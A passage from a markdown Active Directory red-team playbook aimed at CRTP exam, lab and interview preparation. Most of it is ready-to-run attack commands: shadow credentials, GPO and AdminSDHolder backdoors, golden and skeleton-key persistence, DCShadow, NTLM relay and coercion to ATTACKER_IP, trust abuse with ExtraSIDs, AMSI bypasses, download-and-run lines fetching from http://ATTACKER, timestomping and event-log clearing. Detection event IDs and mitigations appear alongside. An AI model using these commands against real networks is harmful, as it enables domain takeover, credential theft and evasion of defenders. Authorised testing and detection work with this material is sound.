python3 pywhisker.py -d corp.local -u lowprivuser -p 'Password1' --target targetcomputer$ --action add --filename shadow_cert

# After adding shadow credential, request TGT using certificate
.\Rubeus.exe asktgt /user:targetcomputer$ /certificate:C:\Temp\cert.pfx /password:CertPass1 /domain:corp.local /ptt

# Then dump hashes via PKINIT
.\Rubeus.exe asktgt /user:targetcomputer$ /certificate:... /getcredentials /ptt
```

**Detection:** Event ID **5136** (modification of `msDS-KeyCredentialLink` attribute).

---

## 7. Domain Privilege Escalation

### 7.1 GPO Abuse

**MITRE ATT&CK:** T1484.001

**Prerequisites:** `CreateChild` on GPO container or `GpoEditDeleteModifySecurity` on specific GPO

```powershell
# Find GPOs current user can modify
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "lowprivuser"}

# Create new GPO and link to OU containing DAs
New-GPO -Name "Backdoor GPO" | New-GPLink -Target "OU=Domain Controllers,DC=corp,DC=local"

# Add local admin via GPO (requires SharpGPOAbuse)
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowprivuser --GPOName "Backdoor GPO"

# Or: add immediate scheduled task that runs as SYSTEM
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "corp\administrator" --Command "cmd.exe" --Arguments "/c net localgroup administrators lowprivuser /add" --GPOName "Backdoor GPO"
```

**Detection:** Event ID **5136** (GPO object modification), **4706** (new trust/GPO creation), **4688** on target machine when task executes.

---

### 7.2 AdminSDHolder Backdoor

**MITRE ATT&CK:** T1546

**Prerequisites:** GenericAll or WriteDACL on the `AdminSDHolder` container

```powershell
# Add GenericAll ACE to AdminSDHolder for a controlled account
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName lowprivuser -Rights All -Verbose

# Wait up to 60 minutes for SDProp to run (or force it)
# Force SDProp (requires DA):
$sess = New-PSSession -ComputerName DC01.corp.local
Invoke-Command -Session $sess -ScriptBlock {
    $runner = [adsi]"LDAP://CN=SDProp,CN=DomainUpdates,CN=System,DC=corp,DC=local"
    $runner.runProtectAdminGroupsTask(0)
}

# Verify — lowprivuser now has GenericAll on Domain Admins, administrator, etc.
Get-ObjectAcl -SamAccountName administrator -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "lowprivuser"}
```

**Detection:** Event ID **4662** (access to AdminSDHolder), **5136** (attribute modification).

---

### 7.3 Kerberoastable Service Account to DA

**Full chain example:**

```
1. Enumerate: Get-DomainUser -SPN → find svc_sql
2. Kerberoast: .\Rubeus.exe kerberoast /user:svc_sql
3. Crack: hashcat -m 13100 hash.txt rockyou.txt → "ServicePass1!"
4. Check membership: Get-DomainGroupMember "Domain Admins" → svc_sql is DA!
   (or: svc_sql has ACL giving GenericAll on DA group)
5. Laterally move as svc_sql, DCSync, game over
```

---

## 8. Domain Persistence

### 8.1 Golden Ticket Persistence

> See Section 4.3 for creation. Key persistence value: 10-year ticket survives krbtgt password rotation (requires two rotations to invalidate).

```
# 10-year ticket
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:HASH /user:PersistAdmin /id:500 /groups:512 /endin:52560000 /renewmax:52560000 /ptt
```

---

### 8.2 Silver Ticket Persistence

> See Section 4.4. Survives krbtgt rotation indefinitely (only invalidated by rotating the service account's password).

---

### 8.3 Skeleton Key

**MITRE ATT&CK:** T1556.001

**Prerequisites:** DA on DC

```
# Patch LSASS on DC — adds "mimikatz" as master password for ALL domain accounts
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Can now authenticate as ANY user with password "mimikatz"
net use \\DC01.corp.local\admin$ /user:corp\administrator mimikatz
```

> **Limitations:** Non-persistent (cleared on DC reboot), only active on the patched DC, detectable via LSASS patch detection.

**Detection:** Sysmon Event 10 (process access on lsass), Event ID **4611** (trusted logon process registered).

---

### 8.4 DSRM Password Abuse

**MITRE ATT&CK:** T1003.004

**Prerequisites:** DA on DC

```
# Step 1: Dump DSRM (Directory Services Restore Mode) hash
mimikatz # token::elevate
mimikatz # lsadump::lsa /patch      # Look for "SAM" account entry

# Step 2: Enable network logon for DSRM account
# (Requires either DA or SYSTEM on DC)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Step 3: Pass-the-Hash as DSRM admin
impacket-secretsdump -hashes :DSRM_HASH './Administrator'@192.168.1.100
mimikatz # sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:DSRM_HASH /run:cmd.exe
```

**Detection:** Registry modification Event **4657**, unusual NTLM auth from DC's local `Administrator` account.

---

### 8.5 DCShadow

**MITRE ATT&CK:** T1207

**Prerequisites:** DA + code execution on domain-joined machine

```
# Requires TWO simultaneous Mimikatz instances

# Window 1 — start listener (registers fake DC)
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:targetuser /attribute:description /value:"backdoor"

# Window 2 — push the change
mimikatz # lsadump::dcshadow /push
```

> DCShadow bypasses standard domain controller audit logging for the pushed attribute.

**Detection:** Event ID **4929** (AD source removed during replication), network traffic on port 49152+ from non-DC machine, Zeek/Netflow anomalies.

---

### 8.6 Custom SSP

**MITRE ATT&CK:** T1556.003

```
# In-memory (non-persistent, cleared on reboot)
mimikatz # misc::memssp
# Credentials logged to: C:\Windows\System32\mimilsa.log

# Persistent via mimilib.dll
# 1. Copy mimilib.dll to C:\Windows\System32\
# 2. Add to Security Packages registry value:
reg query HKLM\System\CurrentControlSet\Control\Lsa /v "Security Packages"
reg add HKLM\System\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
# 3. Reboot DC — all subsequent logins logged to C:\Windows\System32\kiwissp.log
```

---

## 9. NTLM Relay & Coercion Attacks

### 9.1 NTLM Relay with Responder

**MITRE ATT&CK:** T1557.001

**Prerequisites:** Attacker on same network segment; SMB signing disabled on target

**Step 1 — Check SMB signing:**
```bash
cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# Hosts without signing → candidates for relay
```

**Step 2 — Start Responder (disable SMB/HTTP to avoid capturing instead of relaying):**
```bash
# Edit Responder.conf: SMB = Off, HTTP = Off
sudo python3 Responder.py -I eth0 -rdwv
```

**Step 3 — Start ntlmrelayx:**
```bash
# Relay to SMB → dump SAM/LSA from target
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Relay to SMB + exec command
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net localgroup administrators attacker /add"

# Relay to LDAP → create DA
impacket-ntlmrelayx -t ldap://DC01.corp.local --escalate-user lowprivuser
```

**Step 4 — Wait for/trigger authentication:**
```bash
# Trigger NBNS/LLMNR response (passive — wait for broadcast)
# Or coerce authentication with PetitPotam/PrinterBug (see below)
```

**Detection:** Responder creates LLMNR/NBNS responses → Event ID **4648** (explicit logon), NTLM auth from unexpected source.

---

### 9.2 mitm6 + NTLM Relay

**MITRE ATT&CK:** T1557.001

**Prerequisites:** IPv6 enabled on network (default on Windows)

```bash
# Step 1 — Start mitm6 to poison IPv6 DNS and serve WPAD
sudo python3 mitm6.py -d corp.local

# Step 2 — Relay NTLM to LDAPS → create new DA account
impacket-ntlmrelayx -6 -t ldaps://DC01.corp.local -wh attacker-wpad.corp.local --delegate-access --no-smb-server

# Step 3 — After machine account created, use RBCD to get admin
# (ntlmrelayx will report a new machine account and delegate-access setup)
.\Rubeus.exe s4u /user:ATKR_PC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/SRV01.corp.local /ptt
```

**Detection:** IPv6 DNS responses from non-DC hosts (Event in DNS debug log), LDAP account creation event **4720**.

---

### 9.3 PetitPotam

**MITRE ATT&CK:** T1187

**Prerequisites:** Valid domain user (or unauthenticated in older versions); NTLM relay listener ready

```bash
# Coerce DC to authenticate to attacker
python3 PetitPotam.py -u lowprivuser -p 'Password1' -d corp.local ATTACKER_IP DC01.corp.local

# Chain: coerce DC → relay to ADCS HTTP endpoint (ESC8)
# ADCS must have enrollment web service enabled (certsrv)
impacket-ntlmrelayx -t http://ADCS.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
# Result: DC certificate → convert to TGT with PKINIT → DCSync
```

**Detection:** Event ID **4624** (logon) from DC to attacker host on port 445, unusual EFSRPC traffic.

---

### 9.4 MS-RPRN PrinterBug

**MITRE ATT&CK:** T1187

```bash
# Coerce DC01 to authenticate to delhost (must have Print Spooler running on DC)
# SpoolSample.exe (Windows)
.\SpoolSample.exe DC01.corp.local delhost.corp.local

# From Linux
impacket-rpcdump 192.168.1.100 | grep -i 'MS-RPRN\|PrintSystem'
python3 printerbug.py corp.local/lowprivuser:'Password1'@DC01.corp.local attacker.corp.local
```

**Chain with unconstrained delegation:** After coercion, TGT for DC computer account arrives at delegation host. Extract with Rubeus, use for DCSync.

**Detection:** Spooler network traffic; Event ID **4624** from DC to attacker; disable Print Spooler on DCs to mitigate.

---

### 9.5 NTLM Relay to LDAP → RBCD Privilege Escalation

```bash
# Combined: coerce any computer account authentication, relay to LDAP
impacket-ntlmrelayx -t ldap://DC01.corp.local --delegate-access --no-smb-server --no-http-server

# Coerce a machine:
python3 PetitPotam.py -u lowprivuser -p 'Password1' ATTACKER_IP SRV01.corp.local

# ntlmrelayx creates attacker machine account and sets RBCD on SRV01
# Then:
.\Rubeus.exe s4u /user:ATTACKERPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/SRV01.corp.local /ptt
```

---

### 9.6 SCF / WebDAV Hash Capture

**MITRE ATT&CK:** T1187

```bash
# Create malicious SCF file in accessible share
# Content of @backdoor.scf:
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon

# Place in shared network folder — Windows Explorer auto-triggers hash request
# Responder captures NTLM hash → crack offline
hashcat -m 5600 ntlm_hash.txt rockyou.txt  # Mode 5600 = NTLMv2
```

---

## 10. Forest & Trust Attacks

### 10.1 Child-to-Parent Trust Abuse (ExtraSIDs)

**MITRE ATT&CK:** T1134.005

**Prerequisites:** DA in child domain

```
# Step 1: Get child domain krbtgt hash
mimikatz # lsadump::dcsync /domain:child.corp.local /user:child\krbtgt

# Step 2: Get Enterprise Admin SID (of parent domain)
# SID = parent domain SID + RID 519
Get-DomainGroup -Domain corp.local "Enterprise Admins" | Select-Object objectsid

# Step 3: Forge inter-realm TGT with ExtraSIDs (inject EA SID into SIDHistory)
mimikatz # kerberos::golden /user:ChildAdmin /domain:child.corp.local /sid:S-1-5-21-CHILD-SID /krbtgt:CHILD_KRBTGT_HASH /sids:S-1-5-21-PARENT-SID-519 /ptt
```
> The `/sids:` parameter injects the Enterprise Admins SID via SID History, granting forest-level admin rights.

**Detection:** Event ID **4769** with unusual SIDHistory field in Kerberos ticket.

---

### 10.2 Trust Key Extraction

```
# Extract trust keys (NTLM hash of trust relationship)
mimikatz # lsadump::trust /patch     # on DC of child domain

# Forge inter-realm TGT using trust key
mimikatz # kerberos::golden /user:FakeAdmin /domain:child.corp.local /sid:CHILD_SID /rc4:TRUST_KEY /service:krbtgt /target:corp.local /sids:PARENT_EA_SID /ptt
```

---

### 10.3 SID History Injection

**MITRE ATT&CK:** T1134.005

```
# Inject privileged SID into existing account's SIDHistory
mimikatz # privilege::debug
mimikatz # sid::patch              # patch SID filter
mimikatz # sid::add /sam:lowprivuser /new:S-1-5-21-PARENT-SID-500    # inject DA SID

# Now lowprivuser inherits DA rights via SIDHistory
```

**Detection:** Event ID **4765**, **4766** (SIDHistory add/attempt), LDAP modification on `sIDHistory` attribute.

---

## 11. OPSEC & Evasion

### 11.1 AMSI Bypass

**MITRE ATT&CK:** T1562.001

```powershell
# In-memory patch (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative: string obfuscation forces re-scan bypass
$a = 'System.Management.Automation';$b = '.AmsiUtils'
[Ref].Assembly.GetType($a+$b).GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)

# PowerShell downgrade (disables AMSI + logging)
powershell -version 2 -command "..."
```

> These are well-documented bypass techniques. Note: modern EDR solutions detect most of these via kernel-level hooks. Test effectiveness in your lab first.

---

### 11.2 PowerShell Logging Evasion

**MITRE ATT&CK:** T1562

```powershell
# Disable script block logging (requires admin)
Set-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0

# Use PowerShell v2 (no script block logging)
powershell -version 2

# Run commands from memory (never touch disk)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')

# Use Invoke-Obfuscation for syntax obfuscation
```

---

### 11.3 EDR Evasion Considerations

- **Avoid touching disk:** Load tools reflectively via `IEX`, Cobalt Strike `execute-assembly`, or `Invoke-ReflectivePEInjection`
- **Rubeus/Mimikatz alternatives:** SharpKatz (C# port), pypykatz (Python), certipy for PKINIT-based credential theft
- **Process injection:** Avoid `cmd.exe` as parent process; use legitimate parent processes
- **LOLBAS:** Use built-in binaries where possible:
  ```
  certutil -urlcache -split -f http://ATTACKER/tool.exe C:\Temp\tool.exe
  rundll32.exe comsvcs.dll MiniDump (LSASS dump)
  wmic process call create (execution)
  mshta http://ATTACKER/payload.hta (execution)
  ```
- **Timestomping:**
  ```powershell
  (Get-Item C:\Temp\malware.exe).CreationTime = "01/01/2020 09:00:00"
  (Get-Item C:\Temp\malware.exe).LastWriteTime = "01/01/2020 09:00:00"
  ```

---

### 11.4 Ticket Cleanup

```powershell
# Remove all cached Kerberos tickets
.\Rubeus.exe purge
# or: klist purge

# Remove specific ticket by LUID
klist purge -li 0xABCDE
```

---

### 11.5 Log Clearing

```cmd
# Clear Windows Security Event Log (requires admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# PowerShell equivalent
Get-EventLog -LogName Security | Remove-EventLog Security
```

> **Note:** Log clearing itself generates Event ID **1102** (Security log cleared) and **104** (System log cleared) — extremely high-confidence IOC. In real engagements, clearing logs often attracts more attention than the attack itself.

---

## 12. Defense & Detection Awareness

### 12.1 Key Windows Event IDs

| Attack | Event ID | Channel | Notes |
|--------|----------|---------|-------|
| LDAP enumeration | 4661 | Security | Object access (requires auditing) |
| Kerberoasting | 4769 | Security | Etype 0x17 (RC4) — anomalous on AES domain |
| AS-REP Roasting | 4768 | Security | Pre-auth not required |
| Pass-the-Hash | 4624 (Type 3) | Security | NTLM auth — should be Kerberos |
| DCSync | 4662 | Security | GUID: DS-Replication-Get-Changes |
| NTDS.dit dump | 4663 | Security | ntdsutil, vss access |
| Golden Ticket | 4769 | Security | Unusual ticket lifetime |
| Silver Ticket | (none on DC) | — | No DC contact — detect on service host |
| Skeleton Key | Event 10 | Sysmon | lsass.exe process access |
| GPO modification | 5136 | Security | Directory service change |
| SIDHistory abuse | 4765/4766 | Security | SIDHistory add |
| Log clearing | 1102 | Security | Security audit log cleared |
| Mimikatz privilege::debug | 4672 | Security | Special privileges assigned |
| NTLM relay | 4624+4648 | Security | Logon from unexpected source |
| Shadow Credentials | 5136 | Security | msDS-KeyCredentialLink modified |

---

### 12.2 Honey Tokens & Canary Accounts

- **Canary accounts:** Accounts with "Do not require Kerberos preauthentication" but never legitimately used — AS-REP requests trigger immediate alert
- **Honey SPNs:** Service accounts with SPNs set, never legitimately used — Kerberoast request triggers alert
- **BloodHound decoys:** Create high-privilege-looking ACL paths that are monitored
- **LAPS:** Randomizes local admin passwords — makes PTH harder horizontally

> In lab testing: be aware of these in CRTP — the exam environment may have canaries. A real AS-REP or Kerberoast request against a canary could be monitored.

---

### 12.3 Key Mitigations (For Context)

| Attack | Primary Mitigation |
|--------|------------------|
| Kerberoasting | Long, complex service account passwords; use gMSA |
| AS-REP Roasting | Require pre-auth on all accounts |
| Pass-the-Hash | Credential Guard; Protected Users group |
| NTLM Relay | Enable SMB signing; disable NTLM where possible |
| Unconstrained Delegation | Migrate to constrained/RBCD; Protected Users group |
| DCSync | Restrict DS-Replication rights; monitor Event 4662 |
| Golden Ticket | Rotate krbtgt twice; monitor abnormal ticket lifetimes |
| LSASS Dumping | PPL (Protected Process Light); Credential Guard |
| Coercion (PetitPotam) | Disable Print Spooler on DCs; patch MS-EFSR |

---

## 13. CRTP Exam Playbook

### 13.1 CRTP Exam Objectives (Nikhil Mittal / Altered Security)

The CRTP (Certified Red Team Professional) exam covers:
1. Domain enumeration
2. Local privilege escalation
3. Domain privilege escalation (via trusts, Kerberos, ACLs, etc.)
4. Domain persistence
5. Cross-forest attacks

### 13.2 CRTP Toolset

The CRTP course specifically uses:
```powershell
PowerView.ps1                  # PowerSploit fork maintained for CRTP
Invoke-Mimikatz.ps1            # PowerShell Mimikatz wrapper (reflective loading)
Rubeus.exe                     # GhostPack Kerberos toolkit
BloodHound + SharpHound        # AD graph enumeration
ActiveDirectory module (RSAT)  # Built-in Windows AD cmdlets
```

**Loading tools (CRTP style — bypass execution policy + AMSI):**
```powershell
powershell -ep bypass
iex (iwr http://ATTACKER/PowerView.ps1 -UseBasicParsing)
# or: . C:\ADTools\PowerView.ps1
```

### 13.3 CRTP Lab Methodology — Foothold to DA

```
Step 1: Enumerate domain
  Get-Domain, Get-DomainUser, Get-DomainComputer, Get-DomainTrust

Step 2: Identify attack paths
  - Run SharpHound → upload to BloodHound
  - Look for: Kerberoastable accounts, AS-REP roastable, unconstrained delegation hosts

Step 3: Escalate locally (if needed)
  - Find services, scheduled tasks, unquoted service paths
  - Check for local admin across machines: Find-LocalAdminAccess

Step 4: Credential access
  - Kerberoast: Invoke-Kerberoast → hashcat → crack password
  - If DA session found: Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

Step 5: Lateral movement
  - Enter-PSSession or Invoke-Command to accessible machines
  - Use obtained credentials

Step 6: Domain privilege escalation
  - Check delegation → abuse unconstrained/constrained delegation
  - Check ACLs → WriteDACL/GenericAll chains
  - Check trusts → child-to-parent ExtraSIDs

Step 7: Domain persistence
  - Golden Ticket: get krbtgt hash → forge ticket
  - DCSync: grant replication rights → dump all hashes

Step 8: Cross-forest (if applicable)
  - Get trust keys, forge inter-realm TGT with ExtraSIDs
```

### 13.4 CRTP-Specific PowerView Commands Quick Reference

```powershell
# Enumeration essentials
Get-DomainTrust -API
Get-ForestDomain
Get-ForestTrust
Get-DomainController -Domain corp.local
Get-DomainUser -Properties samaccountname,description,memberof | Where-Object {$_.description -ne $null}

# Find interesting access
Find-LocalAdminAccess -Verbose
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
Find-DomainUserLocation -Stealth  # less noisy, checks only DCs

# ACL hunting
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.identityreferencename -match "studentX"}

# Delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -Unconstrained | select name
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

---

## 14. Red Team Interview Prep

### 14.1 Common Red Team Interview Questions with Model Answers

---

**Q: Walk me through a full Active Directory attack chain from initial access to Domain Admin.**

> **Model Answer:**
> "Starting from a low-privileged foothold on a domain-joined workstation, I'd begin by running PowerView for domain enumeration — Get-DomainUser, Get-DomainComputer, and Get-DomainTrust to understand the environment. I'd run SharpHound and pull it into BloodHound to find attack paths graphically.
>
> From there, I'd look for quick wins: AS-REP roastable accounts (no pre-auth required), Kerberoastable service accounts, and misconfigured delegations. If I find a Kerberoastable service account, I'll request the TGS, crack it offline with hashcat (-m 13100), and if the service account is in Domain Admins or has a path there, that's my escalation.
>
> If those don't pan out, I'll look at ACL abuse via BloodHound edges — if my account has WriteDACL on the domain object, I can grant myself DCSync rights and dump all hashes. Once I have DA credentials, I run DCSync to get the krbtgt hash, forge a Golden Ticket with a 10-year lifetime as persistence, and I'm done."

---

**Q: What's the difference between a Golden Ticket and a Silver Ticket?**

> **Model Answer:**
> "Both are forged Kerberos tickets, but they serve different purposes. A Golden Ticket is a forged TGT — it's signed with the krbtgt hash, which means it's validated by every service in the domain. You forge it by getting the krbtgt NTLM hash and using Mimikatz kerberos::golden. It contacts the DC when you try to use it for a TGS request, so it still generates Event 4769.
>
> A Silver Ticket is a forged TGS for a specific service — it's signed with the service account's hash. The key difference is it never contacts the DC at all, so there's no DC-side logging. It's more stealthy but limited to a single service on a single host. You'd use it to persistently access a specific service like CIFS or MSSQL without hitting the DC."

---

**Q: Explain NTLM relay and when you'd use it.**

> **Model Answer:**
> "NTLM relay is a MitM technique where you intercept an NTLM authentication challenge/response and forward it to another service on behalf of the victim. The victim authenticates to your attacker machine; you relay those credentials to the target.
>
> The key prerequisites are: SMB signing must be disabled on the target (you check with `cme smb --gen-relay-list`), and you need a way to trigger authentication — either passively via LLMNR/NBNS poisoning with Responder, or actively by coercing a machine with PetitPotam or PrinterBug.
>
> My typical setup is: Responder with SMB/HTTP disabled (so it poisons but doesn't capture), ntlmrelayx pointing at my relay target list. I'd relay to SMB for SAM/LSA dumps on member servers, or relay to LDAP on the DC to escalate privileges or set up RBCD."

---

**Q: What is Kerberoasting and how do you defend against it?**

> **Model Answer:**
> "Kerberoasting exploits the fact that any domain user can request a Kerberos TGS ticket for any account with an SPN set, and that ticket is encrypted with the service account's NTLM hash. You take that ticket offline and crack it without ever touching the service.
>
> The attack is: enumerate accounts with SPNs (PowerView Get-DomainUser -SPN, or Rubeus kerberoast stats), request the TGS (Rubeus kerberoast /outfile), crack offline with hashcat mode 13100 for RC4 or 19700 for AES256.
>
> Defenses: Use long, random passwords (25+ chars) for service accounts so cracking is infeasible. Better yet, use Group Managed Service Accounts (gMSA) — the password is managed by AD, 120 chars, rotated automatically. Also enforce AES-only for service accounts to prevent RC4 downgrade, and monitor Event 4769 for anomalous RC4 ticket requests."

---

**Q: What is BloodHound and how does it change your approach?**

> **Model Answer:**
> "BloodHound is a graph-based AD attack path tool. SharpHound collects data — ACLs, group memberships, sessions, trust relationships, delegation configs — and BloodHound renders it as a directed graph where nodes are AD objects and edges are relationships like GenericAll, WriteDACL, MemberOf, HasSession.
>
> It fundamentally changes the approach because it finds non-obvious multi-hop attack paths that you'd never find manually. For example: your compromised user has GenericWrite on a service account, which has constrained delegation to a server where a DA is logged in. BloodHound shows that 3-edge chain as a single 'shortest path to DA.' Without it, you'd miss it.
>
> In practice: I run SharpHound All collection, import the zip, then run 'Shortest Paths to Domain Admins from Owned Principals' with my compromised accounts marked as Owned. The graph immediately shows me the attack chain."

---

**Q: What is Resource-Based Constrained Delegation and why does it matter?**

> **Model Answer:**
> "RBCD is a delegation configuration where a target computer specifies which principals can delegate to it — stored in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Unlike traditional constrained delegation which is configured on the delegating account, RBCD is configured on the target.
>
> Why it matters for red teamers: if you have any write access to a computer object's attributes — GenericAll, GenericWrite, WriteDACL, even WriteProperty on that specific attribute — you can set up RBCD yourself by pointing it at a machine account you control. Then you use S4U2Self + S4U2Proxy to impersonate any user, including Administrator, to that computer.
>
> The attack chain: gain write access to a computer object → create or use a machine account → set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target to your machine account → use Rubeus s4u to get a service ticket as Administrator to the target's CIFS service. This is also the output of ntlmrelayx --delegate-access when relaying to LDAP."

---

**Q: How do you approach OPSEC in a red team engagement?**

> **Model Answer:**
> "OPSEC considerations drive every tool choice. I load tools from memory where possible — Rubeus via execute-assembly, PowerView via IEX download — to avoid disk artifacts and AV. I use Kerberos over NTLM whenever possible since Kerberos is less monitored. I prefer wmiexec over psexec because psexec creates a service, which is a high-confidence IOC (Event 7045).
>
> For credential dumping, I prefer DCSync (replication via the network) over touching LSASS, which triggers EDR. I use LOLBAS techniques where possible — comsvcs.dll for LSASS dumps instead of procdump.
>
> I track what events I'm generating: every Kerberoast request fires Event 4769, every LDAP query with unusual volume stands out, every lateral movement leaves 4624 type 3 events. I try to blend into normal traffic patterns and avoid bulk operations during off-hours that would stand out.
>
> Finally, I clean up artifacts: purge Kerberos tickets with Rubeus purge, remove any files I dropped, document what I modified so I can restore it."

---

### 14.2 Full Attack Chain Narrative (Foothold to DA)

**Scenario: Low-privileged domain user on a workstation, target is Domain Admin.**

```
Phase 1 — Situational Awareness (T1087, T1069, T1482)
  • Get-Domain: corp.local, DC01 is DC
  • Get-DomainTrust: child domain child.corp.local exists
  • Get-DomainComputer -Unconstrained: SRV-PRINT has unconstrained delegation
  • Run SharpHound All → BloodHound shows:
    - SVC-SQL is Kerberoastable and member of Server Admins
    - Server Admins has GenericAll on Domain Admins

Phase 2 — Credential Access (T1558.003)
  • Rubeus kerberoast /user:SVC-SQL → crack RC4 hash with hashcat -m 13100
  • Result: SVC-SQL password = "SqlService2019!"

Phase 3 — Privilege Escalation via ACL (T1484)
  • SVC-SQL is member of Server Admins
  • Server Admins has GenericAll on Domain Admins
  • Add-DomainGroupMember -Identity 'Domain Admins' -Members SVC-SQL (as SVC-SQL)
  • Or: Add self to DA via GenericAll

Phase 4 — Domain Persistence (T1558.001)
  • DCSync: lsadump::dcsync /user:krbtgt → get krbtgt hash
  • Forge Golden Ticket with 10-year validity → load via ptt
  • Game over — any DA-level action now available

Phase 5 — Cross-Forest (T1134.005)
  • Get trust key for child → parent trust
  • Forge inter-realm TGT with /sids:EA_SID → access parent domain
```

---

## 15. Tool Reference Appendix

### 15.1 Quick Command Cheat Sheet

| Goal | Tool | Command |
|------|------|---------|
| Domain enum | PowerView | `Get-Domain; Get-DomainUser; Get-DomainTrust` |
| AD graph | SharpHound | `.\SharpHound.exe -c All` |
| Kerberoast | Rubeus | `.\Rubeus.exe kerberoast /outfile:kers.txt` |
| AS-REP Roast | Rubeus | `.\Rubeus.exe asreproast /format:hashcat` |
| PTH | Impacket | `impacket-wmiexec -hashes :HASH domain/user@IP` |
| NTLM relay | ntlmrelayx | `impacket-ntlmrelayx -tf targets.txt -smb2support` |
| Hash dump | Mimikatz | `sekurlsa::logonpasswords` |
| DCSync | Mimikatz | `lsadump::dcsync /user:krbtgt` |
| Golden Ticket | Mimikatz | `kerberos::golden /krbtgt:HASH /sid:SID /user:x /ptt` |
| BloodHound CE | Docker | `docker compose up -d` |
| evil-winrm | gem | `evil-winrm -i IP -u user -H HASH` |
| Password spray | Kerbrute | `./kerbrute passwordspray -d domain dc users.txt Pass` |
| Coercion | PetitPotam | `python3 PetitPotam.py -u user -p pass ATTACKER DC` |
| IPv6 relay | mitm6 | `sudo python3 mitm6.py -d domain.local` |

### 15.2 Key Sources & References

- **harmj0y.net** — ACL abuse, Kerberos attacks, delegation research
- **posts.specterops.io** — BloodHound, Shadow Credentials, modern AD research
- **attack.mitre.org** — ATT&CK technique reference (T-IDs throughout)
- **ired.team** — Command-level playbooks for all major AD techniques
- **book.hacktricks.xyz** — Comprehensive cheatsheet reference
- **dirkjanm.io** — mitm6, NTLM relay, AD CS attacks (Dirk-jan Mollema)
- **github.com/gentilkiwi/mimikatz** — Mimikatz official
- **github.com/GhostPack** — Rubeus, SharpHound, Whisker, Seatbelt
- **github.com/fortra/impacket** — Impacket suite
- **github.com/lgandx/Responder** — Responder
- **nikhilmittal.com** — CRTP/CRTE course content (Altered Security)

### 15.3 Hashcat Mode Reference

| Hash Type | Mode | Context |
|-----------|------|---------|
| NTLMv1 | 3000 | Old Windows auth |
| NTLMv2 | 5600 | Modern Windows auth / Responder captures |
| Net-NTLMv2 | 5600 | NTLM relay captures |
| Kerberos TGS RC4 | 13100 | Kerberoasting |
| Kerberos TGS AES128 | 19600 | Kerberoasting (AES) |
| Kerberos TGS AES256 | 19700 | Kerberoasting (AES) |
| Kerberos AS-REP | 18200 | AS-REP Roasting |
| DCC2 / MSCachev2 | 2100 | Cached domain creds |
| NTLM | 1000 | Pass-the-Hash hash format |

---

*End of Playbook — v1.0 | Built for CRTP / Lab / Interview use*
